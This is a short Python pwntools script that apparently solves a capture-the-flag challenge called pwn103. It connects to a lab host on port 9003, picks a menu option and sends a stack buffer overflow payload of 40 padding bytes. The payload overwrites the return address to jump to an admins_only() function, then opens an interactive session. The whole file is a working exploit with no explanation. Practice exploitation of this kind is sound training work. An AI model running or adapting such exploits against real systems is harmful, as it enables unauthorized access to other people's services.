from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.123.21', 9003)
    else:
        r = process('./pwn103.pwn103')

    r.recvuntil('Choose the channel: ')
    r.sendline(b'3')

    r.recvuntil('------[pwner]: ')

    payload = b'A'*40
    payload += p64(0x401555)            # admins_only() + 1    

    r.sendline(payload)
    r.recvline()
    r.recvline()
    r.interactive()
exploit(True)